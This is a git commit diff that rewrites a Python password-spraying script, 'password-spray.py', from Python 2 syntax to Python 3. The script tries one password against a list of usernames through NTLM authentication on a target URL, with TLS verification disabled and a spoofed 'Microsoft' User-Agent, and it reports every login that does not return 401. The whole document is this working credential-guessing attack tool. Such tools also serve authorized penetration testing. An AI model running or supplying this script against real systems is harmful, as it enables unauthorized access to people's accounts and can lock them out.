dc1849d79d4d9b015003008c6c0deb4122da712d
c0d3cr4f73r <66146701+c0d3cr4f73r@users.noreply.github.com>
2024-04-11 17:35:18 -0400

    Update password-spray.py

--- password-spray.py
+++ password-spray.py
@@ -1,36 +1,36 @@
 import sys
 import base64
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from requests_ntlm import HttpNtlmAuth
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 VERSION = "1.1"
 
 def send_request(username, password, url, domain):
+    if domain == "":
+        username = "{}".format(username)
+    else:
+        username = "{}\\{}".format(domain, username)
 
-	if domain == "":
-		username = "%s" % (username)
-	else:
-		username = "%s\\%s" % (domain, username)
-
-	print "Trying user %s" % (username)
-        try:
-                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-                req = requests.get(url, auth = HttpNtlmAuth(username, password), headers = {'User-Agent': 'Microsoft'}, verify=False)
-                if not req.status_code == 401:
-                        print "User %s password is %s" % (username, password)
-        except:
-                print sys.exc_info()[0]
+    print("Trying user {}".format(username))
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        req = requests.get(url, auth=HttpNtlmAuth(username, password), headers={'User-Agent': 'Microsoft'}, verify=False)
+        if not req.status_code == 401:
+            print("User {} password is {}".format(username, password))
+    except Exception as e:
+        print(e)
 
 if __name__ == "__main__":
-        print "PasswordSpraying v%s\nWith Love c0d3cr4f73r \n-----------------------------------\n\n" % VERSION
-        if len(sys.argv) < 5:
-                print "Usage: %s [user list] [domain] [url] [password]" % sys.argv[0]
-                sys.exit(0)
+    print("PasswordSpraying v{}\nWith Love c0d3cr4f73r \n-----------------------------------\n\n".format(VERSION))
+    if len(sys.argv) < 5:
+        print("Usage: {} [user list] [domain] [url] [password]".format(sys.argv[0]))
+        sys.exit(0)
 
-        domain = sys.argv[2]
-        url = sys.argv[3]
-        password = sys.argv[4]
-        print "Spraying password %s against %s using domain %s" % (password, url, domain)
-        for email in open(sys.argv[1], "rb").readlines():
-                send_request(email.strip(), password, url, domain)
+    domain = sys.argv[2]
+    url = sys.argv[3]
+    password = sys.argv[4]
+    print("Spraying password {} against {} using domain {}".format(password, url, domain))
+    with open(sys.argv[1], "rb") as f:
+        for email in f.readlines():
+            send_request(email.strip().decode("utf-8"), password, url, domain)
